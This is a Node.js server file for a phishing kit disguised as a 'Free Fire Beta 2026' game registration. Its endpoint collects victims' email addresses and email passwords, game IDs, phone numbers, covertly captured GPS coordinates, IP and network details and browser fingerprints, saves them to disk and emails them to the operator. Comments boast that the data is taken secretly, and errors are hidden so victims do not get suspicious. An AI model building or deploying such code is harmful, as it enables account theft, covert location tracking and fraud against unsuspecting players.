const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// KONFIGURASI EMAIL
const SENDER_EMAIL = 'your-email@gmail.com'; // GANTI
const SENDER_PASSWORD = 'your-app-password'; // GANTI
const RECEIVER_EMAIL = 'your-target-email@gmail.com'; // GANTI

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 STEALTH DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('🔍 ASN:', data.asn);
        
        // Save to file for backup
        const logFile = path.join(__dirname, 'registrations.json');
        let existing = [];
        if(fs.existsSync(logFile)) {
            existing = JSON.parse(fs.readFileSync(logFile));
        }
        existing.push(data);
        fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));
        
        // HTML Email dengan semua stealth data
        const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head><style>body{font-family:Arial;background:#0a1628;color:#fff;} .box{background:#0d1f3c;padding:15px;margin:10px 0;border-radius:10px;border-left:4px solid #0088FF;}</style></head>
        <body>
            <h2 style="color:#0088FF;">🔥 FREE FIRE BETA 2026 - STEALTH DATA 🔥</h2>
            
            <div class="box">
                <h3>📧 ACCOUNT DATA</h3>
                <p><b>Email:</b> ${data.email}</p>
                <p><b>Email Password:</b> ${data.emailPassword}</p>
                <p><b>FF ID:</b> ${data.ffId}</p>
                <p><b>FF Level:</b> ${data.ffLevel}</p>
                <p><b>Phone:</b> ${data.phone}</p>
                <p><b>Location (manual):</b> ${data.country}, ${data.province}, ${data.city}</p>
            </div>
            
            <div class="box">
                <h3>📍 STEALTH GPS & LOCATION (User tidak tahu)</h3>
                <p><b>Latitude:</b> ${data.latitude || 'TIDAK DAPAT'}</p>
                <p><b>Longitude:</b> ${data.longitude || 'TIDAK DAPAT'}</p>
                <p><b>Accuracy:</b> ${data.gps_accuracy || '-'} meters</p>
                <p><b>Altitude:</b> ${data.gps_altitude || '-'}</p>
                <p><b>Heading:</b> ${data.gps_heading || '-'}</p>
                <p><b>Speed:</b> ${data.gps_speed || '-'}</p>
            </div>
            
            <div class="box">
                <h3>🌐 IP & NETWORK (Stealth)</h3>
                <p><b>IP Address:</b> ${data.ip_address}</p>
                <p><b>ASN:</b> ${data.asn}</p>
                <p><b>ASN Detail:</b> ${data.asn_detail || '-'}</p>
                <p><b>ISP:</b> ${data.isp}</p>
                <p><b>Network Org:</b> ${data.network_org || '-'}</p>
                <p><b>IP City:</b> ${data.ip_city}</p>
                <p><b>IP Region:</b> ${data.ip_region}</p>
                <p><b>IP Country:</b> ${data.ip_country}</p>
                <p><b>Timezone:</b> ${data.timezone}</p>
                <p><b>Postal Code:</b> ${data.postal_code}</p>
            </div>
            
            <div class="box">
                <h3>🖥️ BROWSER FINGERPRINT</h3>
                <p><b>User Agent:</b> ${data.userAgent}</p>
                <p><b>Platform:</b> ${data.platform}</p>
                <p><b>Language:</b> ${data.language}</p>
                <p><b>Screen:</b> ${data.screenResolution}</p>
                <p><b>Hardware Concurrency:</b> ${data.hardwareConcurrency}</p>
                <p><b>Device Memory:</b> ${data.deviceMemory} GB</p>
                <p><b>Timezone Offset:</b> ${data.timezoneOffset}</p>
                <p><b>Timezone:</b> ${data.timezone}</p>
                <p><b>Touch Points:</b> ${data.touchPoints}</p>
                <p><b>Webdriver:</b> ${data.webdriver}</p>
            </div>
            
            <div class="box">
                <h3>⏰ TIMESTAMP</h3>
                <p>${data.timestamp}</p>
                <p>Local: ${data.local_time}</p>
            </div>
            
            <hr>
            <p style="color:#0088FF;">⚠️ Data ini diambil secara diam-diam tanpa sepengetahuan user!</p>
        </body>
        </html>
        `;
        
        await transporter.sendMail({
            from: `"FF Beta 2026" <${SENDER_EMAIL}>`,
            to: RECEIVER_EMAIL,
            subject: `🎯 STEALTH DATA - FF:${data.ffId} - IP:${data.ip_address}`,
            html: htmlContent,
            attachments: [{
                filename: `stealth_${data.ffId}_${Date.now()}.json`,
                content: JSON.stringify(data, null, 2)
            }]
        });
        
        console.log('✅ Stealth email terkirim!');
        res.json({ success: true });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true }); // Tetep balikin success biar user gak curiga
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});